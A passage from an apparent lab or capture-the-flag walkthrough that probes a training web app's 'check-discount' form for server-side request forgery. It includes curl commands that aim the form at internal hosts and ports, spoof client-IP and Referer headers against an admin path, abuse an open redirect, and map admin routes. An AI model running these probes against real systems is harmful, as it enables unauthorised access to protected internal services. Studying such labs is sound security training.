# HTTP/1.1 400 Bad Request
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 20:37:07 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 16
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"10-m/yQhDwS2T4l/9EmgU86BV9TCKU"
#
# Invalid hostname
```

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://internal-api.checkstock.shop:8080/admin/list-of-items'

# HTTP/1.1 400 Bad Request
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 20:37:27 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 16
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"10-m/yQhDwS2T4l/9EmgU86BV9TCKU"
#
# Invalid hostname
```

The dead `check-stock` stub didn't pan out directly, but let's see if other product pages (or the app's index page) have different commented-out legacy stubs — maybe revealing a different domain, parameter name, or endpoint that's actually live.

**Step 16 — Check other pages for similar commented-out stubs**

```bash
for p in 1 2 3 4 5; do
  echo "=== product/$p ==="
  curl -sS "http://web0x08.hbtn/app4-1/product/$p" | sed -n '1,25p'
  echo
done
```

```bash
echo "=== app4-1 index ==="
curl -sS 'http://web0x08.hbtn/app4-1/' | sed -n '1,30p'
```


**Output:**

```html
for p in 1 2 3 4 5; do
  echo "=== product/$p ==="
  curl -sS "http://web0x08.hbtn/app4-1/product/$p" | sed -n '1,25p'
  echo
done

=== product/1 ===
<!-- <!DOCTYPE html>
<html>
  <head>
    <title>Sample Product 1 - Product Page</title>
  </head>
  <body>
    <h1>Sample Product 1</h1>
    <p>This is a sample product.</p>
    <p>Price: $9.99</p>
    <form action="/check-stock" method="post">
      <input
        type="hidden"
        name="stockApi"
        value="http://internal-api.checkstock.shop/1"
      />
      <button type="submit">Check Stock</button>
    </form>
    <a href="/product/nextProduct?path=/product/2"
      >Next Product</a
    >
  </body>
</html> -->
<!DOCTYPE html>
<html lang="en">
  <head>

=== product/2 ===
<!-- <!DOCTYPE html>
<html>
  <head>
    <title>Sample Product 2 - Product Page</title>
  </head>
  <body>
    <h1>Sample Product 2</h1>
    <p>This is a sample product.</p>
    <p>Price: $9.99</p>
    <form action="/check-stock" method="post">
      <input
        type="hidden"
        name="stockApi"
        value="http://internal-api.checkstock.shop/2"
      />
      <button type="submit">Check Stock</button>
    </form>
    <a href="/product/nextProduct?path=/product/3"
      >Next Product</a
    >
  </body>
</html> -->
<!DOCTYPE html>
<html lang="en">
  <head>

=== product/3 ===
<!-- <!DOCTYPE html>
<html>
  <head>
    <title>Sample Product 3 - Product Page</title>
  </head>
  <body>
    <h1>Sample Product 3</h1>
    <p>This is a sample product.</p>
    <p>Price: $9.99</p>
    <form action="/check-stock" method="post">
      <input
        type="hidden"
        name="stockApi"
        value="http://internal-api.checkstock.shop/3"
      />
      <button type="submit">Check Stock</button>
    </form>
    <a href="/product/nextProduct?path=/product/4"
      >Next Product</a
    >
  </body>
</html> -->
<!DOCTYPE html>
<html lang="en">
  <head>

=== product/4 ===
<!-- <!DOCTYPE html>
<html>
  <head>
    <title>Sample Product 4 - Product Page</title>
  </head>
  <body>
    <h1>Sample Product 4</h1>
    <p>This is a sample product.</p>
    <p>Price: $9.99</p>
    <form action="/check-stock" method="post">
      <input
        type="hidden"
        name="stockApi"
        value="http://internal-api.checkstock.shop/4"
      />
      <button type="submit">Check Stock</button>
    </form>
    <a href="/product/nextProduct?path=/product/5"
      >Next Product</a
    >
  </body>
</html> -->
<!DOCTYPE html>
<html lang="en">
  <head>

=== product/5 ===
<!-- <!DOCTYPE html>
<html>
  <head>
    <title>Sample Product 5 - Product Page</title>
  </head>
  <body>
    <h1>Sample Product 5</h1>
    <p>This is a sample product.</p>
    <p>Price: $9.99</p>
    <form action="/check-stock" method="post">
      <input
        type="hidden"
        name="stockApi"
        value="http://internal-api.checkstock.shop/5"
      />
      <button type="submit">Check Stock</button>
    </form>
    <a href="/product/nextProduct?path=/product/6"
      >Next Product</a
    >
  </body>
</html> -->
<!DOCTYPE html>
<html lang="en">
  <head>
```

```html
echo "=== app4-1 index ==="
curl -sS 'http://web0x08.hbtn/app4-1/' | sed -n '1,30p'

=== app4-1 index ===
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="format-detection" content="telephone=no" />
    <title>Exclusive Shop</title>

    <link
      href="https://fonts.googleapis.com/css?family=PT+Serif:400,400i,700,700ii%7CRoboto:300,300i,400,400i,500,500i,700,700i,900,900i&amp;subset=cyrillic"
      rel="stylesheet"
    />

    <link rel="stylesheet" href="css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="stylesheet" href="css/ion.rangeSlider.css" />
    <link rel="stylesheet" href="css/ion.rangeSlider.skinFlat.css" />
    <link rel="stylesheet" href="css/jquery.bxslider.css" />
    <link rel="stylesheet" href="css/jquery.fancybox.css" />
    <link rel="stylesheet" href="css/flexslider.css" />
    <link rel="stylesheet" href="css/swiper.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="css/media.css" />
  </head>
  <body>
    <!-- Main Content - start -->
    <main>
      <section class="container">
        <!-- Slider -->
```



Let's sanity-check something fundamental: can we reach port 8080 directly ourselves (bypassing the SSRF entirely), to see what's actually sitting there? If it's genuinely a wildcard stub that always says "No discount.", that confirms port 8080 has no admin content and we need a different internal port/service that's only reachable server-side.

**Step 17 — Probe port 8080 directly**

```bash
curl -sS -i 'http://web0x08.hbtn:8080/'
echo "---"
curl -sS -i 'http://web0x08.hbtn:8080/admin/list-of-items'
echo "---"
curl -sS -i 'http://web0x08.hbtn:8080/app4-1/check-discount'
echo "---"
curl -sS -i -X POST 'http://web0x08.hbtn:8080/app4-1/check-discount'
```


**Output:**

```bash
curl -sS -i 'http://web0x08.hbtn:8080/'
echo "---"
curl -sS -i 'http://web0x08.hbtn:8080/admin/list-of-items'
echo "---"
curl -sS -i 'http://web0x08.hbtn:8080/app4-1/check-discount'
echo "---"
curl -sS -i -X POST 'http://web0x08.hbtn:8080/app4-1/check-discount'
# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Tue, 10 Nov 2026 20:49:01 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden---
# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Tue, 10 Nov 2026 20:49:01 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden---
# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Tue, 10 Nov 2026 20:49:01 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden---
# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Tue, 10 Nov 2026 20:49:02 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden
```

Confirmed something important: directly hitting port 8080 from our own machine gives **403 Forbidden** for every path — meaning port 8080 is IP-restricted (only allowed when the request originates from the server itself, i.e. via SSRF). That's consistent with this being the real internal service. But all SSRF-sourced requests we've sent to it return identical "No discount." bytes regardless of path, suggesting either a wildcard catch-all route, or our specified port is being silently overridden to 8080 server-side (which would also explain why our earlier port-scan via SSRF showed identical results for every port).

Let's check if the `/check-stock` stub actually lives on port 8080 rather than port 80.

**Step 18 — Probe `/check-stock` directly on port 8080**

```bash
curl -sS -i 'http://web0x08.hbtn:8080/check-stock'
echo "---"
curl -sS -i 'http://web0x08.hbtn:8080/app4-1/check-stock'
echo "---"
curl -sS -i -X POST 'http://web0x08.hbtn:8080/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/1'
```


**Output:**

```bash
curl -sS -i 'http://web0x08.hbtn:8080/check-stock'
echo "---"
curl -sS -i 'http://web0x08.hbtn:8080/app4-1/check-stock'
echo "---"
curl -sS -i -X POST 'http://web0x08.hbtn:8080/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/1'

# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Tue, 10 Nov 2026 21:01:40 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden---
# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Tue, 10 Nov 2026 21:01:41 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden---
# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Tue, 10 Nov 2026 21:01:41 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden
```


Let's test port 80 (the main site, not the 8080 microservice) for `/admin/list-of-items` and similar admin-style paths — maybe the real admin lives on the main app, not the discount stub.

**Step 19 — Probe admin-style paths on the main site (port 80, via SSRF)**

```bash
for p in "/admin" "/admin/dashboard" "/admin/list-of-items" "/app4-1/admin" "/app4-1/admin/dashboard" "/app4-1/admin/list-of-items"; do
  echo "=== $p ==="
  curl -sS -o - -w '\n[HTTP %{http_code}] size=%{size_download}\n' -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn${p}"
  echo
done
```

**Output:**

```bash
for p in "/admin" "/admin/dashboard" "/admin/list-of-items" "/app4-1/admin" "/app4-1/admin/dashboard" "/app4-1/admin/list-of-items"; do
  echo "=== $p ==="
  curl -sS -o - -w '\n[HTTP %{http_code}] size=%{size_download}\n' -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "articleApi=http://web0x08.hbtn${p}"
  echo
done

# === /admin ===
# No discount.
# [HTTP 200] size=12
#
# === /admin/dashboard ===
# No discount.
# [HTTP 200] size=12
#
# === /admin/list-of-items ===
# No discount.
# [HTTP 200] size=12
#
# === /app4-1/admin ===
# No discount.
# [HTTP 200] size=12
#
# === /app4-1/admin/dashboard ===
# No discount.
# [HTTP 200] size=12
#
# === /app4-1/admin/list-of-items ===
# No discount.
# [HTTP 200] size=12
```

Let's check two things in parallel:
1. confirm port 8080 truly is a path-agnostic stub (test total nonsense path) to close that line of inquiry
2. see if `internal-api.checkstock.shop` resolves to anything at all from our side — if the challenge intends it as a real internal domain, our own DNS/hosts might need an entry, or it may be directly reachable.

**Step 20 — Two quick checks**

```bash
# A) Totally nonsense path via SSRF — confirms whether EVERY path gives "No discount."
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/this-path-does-not-exist-xyz123'
```

```bash
# B) Does internal-api.checkstock.shop resolve for us at all?
getent hosts internal-api.checkstock.shop
echo "exit code: $?"
curl -sS -i --connect-timeout 5 'http://internal-api.checkstock.shop/1'
```


**Output:**

```bash
# A) Totally nonsense path via SSRF — confirms whether EVERY path gives "No discount."
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/this-path-does-not-exist-xyz123'

# No discount.
```

```bash
# B) Does internal-api.checkstock.shop resolve for us at all?
getent hosts internal-api.checkstock.shop
echo "exit code: $?"
curl -sS -i --connect-timeout 5 'http://internal-api.checkstock.shop/1'

# exit code: 2
# curl: (6) Could not resolve host: internal-api.checkstock.shop
```

- put `internal-api.checkstock.shop` in `/etc/hosts` pointing to `web0x08.hbtn` (the same IP as the main site) and retry the command.

```bash
# B) Does internal-api.checkstock.shop resolve for us at all?
getent hosts internal-api.checkstock.shop
echo "exit code: $?"
curl -sS -i --connect-timeout 5 'http://internal-api.checkstock.shop/1'

# 10.42.58.85     internal-api.checkstock.shop
# exit code: 0
# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:12:01 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found
```


Since both hostnames now point to the same box, let's check whether nginx actually treats `internal-api.checkstock.shop` as a **separate virtual host** (different Host header → different backend app on the same IP), which is a very plausible explanation for why that domain exists in the leaked stub at all.

**Step 22 — Compare the two vhosts directly**

```bash
echo "=== web0x08.hbtn root ==="
curl -sS -i 'http://web0x08.hbtn/' -o /tmp/web0x08.hbtn.html
echo
echo "=== internal-api.checkstock.shop root ==="
curl -sS -i 'http://internal-api.checkstock.shop/' -o /tmp/internal-api.html
ls -l /tmp/*.html
diff /tmp/web0x08.hbtn.html /tmp/internal-api.html
```

```bash
echo "=== check-stock on internal-api.checkstock.shop ==="
curl -sS -i -X POST 'http://internal-api.checkstock.shop/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/1'
```

```bash
for p in "/admin" "/admin/dashboard" "/admin/list-of-items" "/app4-1" "/app4-1/check-stock" "/app4-1/admin/list-of-items"; do
  echo "=== internal-api.checkstock.shop${p} ==="
  curl -sS -i "http://internal-api.checkstock.shop${p}"
  echo
done
```


**Output:**

```bash
echo "=== web0x08.hbtn root ==="
curl -sS -i 'http://web0x08.hbtn/' -o /tmp/web0x08.hbtn.html
echo
echo "=== internal-api.checkstock.shop root ==="
curl -sS -i 'http://internal-api.checkstock.shop/' -o /tmp/internal-api.html
ls -l /tmp/*.html
diff /tmp/web0x08.hbtn.html /tmp/internal-api.html

# === web0x08.hbtn root ===
#
# === internal-api.checkstock.shop root ===
# -rw-rw-r-- 1 kali kali 133592 Nov 10 15:42 /tmp/app4-1.html
# -rw-rw-r-- 1 kali kali 132305 Nov 10 16:50 /tmp/internal-api.html
# -rw-rw-r-- 1 kali kali  29938 Nov 10 14:54 /tmp/product1.html
# -rw-rw-r-- 1 kali kali 132305 Nov 10 16:50 /tmp/web0x08.hbtn.html
```

```bash
echo "=== check-stock on internal-api.checkstock.shop ==="
curl -sS -i -X POST 'http://internal-api.checkstock.shop/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/1'

# === check-stock on internal-api.checkstock.shop ===
# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:50:59 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found
```

```bash
for p in "/admin" "/admin/dashboard" "/admin/list-of-items" "/app4-1" "/app4-1/check-stock" "/app4-1/admin/list-of-items"; do
  echo "=== internal-api.checkstock.shop${p} ==="
  curl -sS -i "http://internal-api.checkstock.shop${p}"
  echo
done

# === internal-api.checkstock.shop/admin ===
# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:51:15 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden
# === internal-api.checkstock.shop/admin/dashboard ===
# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:51:15 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found
# === internal-api.checkstock.shop/admin/list-of-items ===
# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:51:15 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden
# === internal-api.checkstock.shop/app4-1 ===
# HTTP/1.1 301 Moved Permanently
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:51:15 GMT
# Content-Type: text/html
# Content-Length: 169
# Location: http://internal-api.checkstock.shop/app4-1/
# Connection: keep-alive
#
# <html>
# <head><title>301 Moved Permanently</title></head>
# <body>
# <center><h1>301 Moved Permanently</h1></center>
# <hr><center>nginx/1.18.0</center>
# </body>
# </html>
#
# === internal-api.checkstock.shop/app4-1/check-stock ===
# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:51:15 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found
# === internal-api.checkstock.shop/app4-1/admin/list-of-items ===
# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:51:15 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found
```

New critical finding: on port 80 (the main site), `/admin` and `/admin/list-of-items` return **403 Forbidden** (real routes, IP-blocked) while `/admin/dashboard` returns a plain **404** (doesn't exist). This confirms a genuine admin area exists on the main app, gated by an IP/origin check — separate from the port-8080 stub.

Since our `check-discount` SSRF seems to always land on the 8080 microservice regardless of the port we specify (that stub's wildcard "No discount." response), we need another way to make the *real* admin check think our request is internal. Let's try the classic IP-spoofing-via-header bypass directly against port 80.

**Step 23 — Try spoofing the origin IP via headers**

```bash
curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'X-Forwarded-For: 127.0.0.1'

echo "---"

curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'X-Real-IP: 127.0.0.1'

echo "---"

curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'X-Originating-IP: 127.0.0.1' \
  -H 'X-Remote-IP: 127.0.0.1' \
  -H 'X-Client-IP: 127.0.0.1'
```


**Output:**

```bash
curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'X-Forwarded-For: 127.0.0.1'

echo "---"

curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'X-Real-IP: 127.0.0.1'

echo "---"

curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'X-Originating-IP: 127.0.0.1' \
  -H 'X-Remote-IP: 127.0.0.1' \
  -H 'X-Client-IP: 127.0.0.1'

# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:59:26 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden---
# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:59:26 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden---
# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 21:59:26 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden
```

The header-spoofing for IP didn't work, meaning it genuinely checks the real socket address. Let's try the other literal reading of hint #4: use the "new feature" (`nextProduct`) URL **as the `Referer` header** when hitting the forbidden admin path directly — maybe the IP-gate is paired with (or replaced by) a Referer-based check that trusts requests appearing to come from that redirector.

**Step 24 — Test Referer-based bypass on `/admin/list-of-items`**

```bash
curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'Referer: http://web0x08.hbtn/app4-1/product/nextProduct?path=/admin/list-of-items'

echo "---"

curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'Referer: http://web0x08.hbtn/app4-1/product/nextProduct'

echo "---"

curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'Referer: http://web0x08.hbtn/'
```


**Output:**

```bash
curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'Referer: http://web0x08.hbtn/app4-1/product/nextProduct?path=/admin/list-of-items'

echo "---"

curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'Referer: http://web0x08.hbtn/app4-1/product/nextProduct'

echo "---"

curl -sS -i 'http://web0x08.hbtn/admin/list-of-items' \
  -H 'Referer: http://web0x08.hbtn/'

# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 22:02:10 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden---
# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 22:02:10 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden---
# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 22:02:10 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden
```


Let's test whether `nextProduct`'s `path` parameter behaves differently when given the *relative* admin path directly (rather than redirecting to a numbered product or an absolute external URL) — maybe it internally forwards privileged paths rather than issuing a plain 302.

**Step 25 — Test `nextProduct` with the admin path as a relative target**

```bash
curl -sS -i 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/admin/list-of-items'
echo "---"
curl -sS -i 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/admin/list-of-items'
echo "---"
curl -sS -i -L 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/admin/list-of-items'
```

Checking whether the first two give a `302` (plain redirect, same as before) or something unexpected, and whether `-L` (follow redirects ourselves) in the third ends up actually showing real content vs. the `403 Forbidden` we'd expect from hitting it as an external client.

**Output:**

```bash
curl -sS -i 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/admin/list-of-items'
echo "---"
curl -sS -i 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/admin/list-of-items'
echo "---"
curl -sS -i -L 'http://web0x08.hbtn/app4-1/product/nextProduct?path=/admin/list-of-items'

# HTTP/1.1 302 Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 22:04:31 GMT
# Content-Type: text/plain; charset=utf-8
# Content-Length: 42
# Connection: keep-alive
# X-Powered-By: Express
# Location: /admin/list-of-items
# Vary: Accept
#
# Found. Redirecting to /admin/list-of-items---
# HTTP/1.1 302 Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 22:04:31 GMT
# Content-Type: text/plain; charset=utf-8
# Content-Length: 49
# Connection: keep-alive
# X-Powered-By: Express
# Location: /app4-1/admin/list-of-items
# Vary: Accept
#
# Found. Redirecting to /app4-1/admin/list-of-items---
# HTTP/1.1 302 Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 22:04:31 GMT
# Content-Type: text/plain; charset=utf-8
# Content-Length: 42
# Connection: keep-alive
# X-Powered-By: Express
# Location: /admin/list-of-items
# Vary: Accept
#
# HTTP/1.1 403 Forbidden
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 22:04:31 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
#
# Forbidden
```

Let's double check the full `check-discount` form markup for any additional hidden fields we might have missed alongside `articleApi`.

**Step 26 — Inspect the full check-discount form**

```bash
sed -n '235,260p' /tmp/product1.html
```

Also, let's directly test whether `check-discount` accepts extra parameters that might reveal more (e.g., a `productId` or similar) by checking what happens with a bare empty POST:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi='
```


**Output:**

```html
sed -n '235,260p' /tmp/product1.html

                <a href="#" class="prod-minus"
                  ><i class="fa fa-angle-down"></i
                ></a>
              </p>
              <p class="prod-addwrap">
                <a href="#" class="prod-add" rel="nofollow">Add </a>
              </p>
              <form action="/app4-1/check-discount" method="post">
                <input
                  type="hidden"
                  name="articleApi"
                  value="http://web0x08.hbtn:8080/app4-1/check-discount"
                />
                <button class="prod-add" type="submit">Check Reduction</button>
              </form>
            </div>
            <ul class="prod-i-props">
              <li><b>SKU</b> 05464207</li>
              <li><b>Material</b> Nylon</li>
              <li><b>Pattern Type</b> Solid</li>
              <li><b>Wash</b> Colored</li>
              <li><b>Style</b> Sport</li>
              <li><b>Color</b> Blue</li>
              <li><b>Gender</b> Unisex</li>
              <li><b>Rain Cover</b> No</li>
              <li><b>Exterior</b> Solid Bag</li>
```


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi='

# HTTP/1.1 400 Bad Request
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 22:08:08 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 43
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"2b-tYDCMtDPxGFZ7tyqHZjvzwXoeWM"
#
# Error Occured while processing your request
```


Let's directly (not via SSRF) map out which admin-style paths genuinely exist (403 = exists but blocked) versus don't exist (404), across both the root-level and `/app4-1/`-prefixed variants, to get a clear picture of the real route structure.

**Step 27 — Map real vs. fake admin routes**

```bash
for p in "/admin" "/admin/dashboard" "/admin/list-of-items" "/app4-1/admin" "/app4-1/admin/dashboard" "/app4-1/admin/list-of-items" "/app4-1/admin/" "/admin/"; do
  code=$(curl -sS -o /dev/null -w '%{http_code}' "http://web0x08.hbtn${p}")
  echo "$p -> $code"
done
```

This will tell us definitively which routes are real (403) vs nonexistent (404) on this specific app, which we can then target via SSRF with confidence.

**Output:**

```bash
for p in "/admin" "/admin/dashboard" "/admin/list-of-items" "/app4-1/admin" "/app4-1/admin/dashboard" "/app4-1/admin/list-of-items" "/app4-1/admin/" "/admin/"; do
  code=$(curl -sS -o /dev/null -w '%{http_code}' "http://web0x08.hbtn${p}")
  echo "$p -> $code"
done

# /admin -> 403
# /admin/dashboard -> 404
# /admin/list-of-items -> 403
# /app4-1/admin -> 404
# /app4-1/admin/dashboard -> 404
# /app4-1/admin/list-of-items -> 404
# /app4-1/admin/ -> 404
# /admin/ -> 403
```


One critical test we haven't actually run: pointing `articleApi` at the site's **root `/`** (implicit port 80) via SSRF. If the response reflects real content, we'd expect a large HTML page (the homepage, ~130KB as we've seen directly); if we get the tiny `"No discount."` again, that confirms every SSRF request is actually landing on the port-8080 stub regardless of what we specify.

**Step 28 — Decisive test: SSRF to site root**

```bash
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/' \
  -w '\n[size=%{size_download}]\n'
```


**Output:**

```bash
curl -sS -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/' \
  -w '\n[size=%{size_download}]\n'

# No discount.
# [size=12]
```

New idea worth testing immediately: the app is named `app4-1` — the `-1` suffix strongly suggests there might be a sibling `app4-2` (a separate backend/admin service), which would fit hint #5's "other API call to backend services."

**Step 29 — Check for a sibling app**

```bash
curl -sS -i 'http://web0x08.hbtn/app4-2/'
echo "---"
curl -sS -i 'http://web0x08.hbtn/app4-2'
```


**Output:**

```bash
curl -sS -i 'http://web0x08.hbtn/app4-2/'
echo "---"
curl -sS -i 'http://web0x08.hbtn/app4-2'

HTTP/1.1 403 Forbidden
Server: nginx/1.18.0
Date: Tue, 10 Nov 2026 22:16:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 9
Connection: keep-alive
X-Powered-By: Express
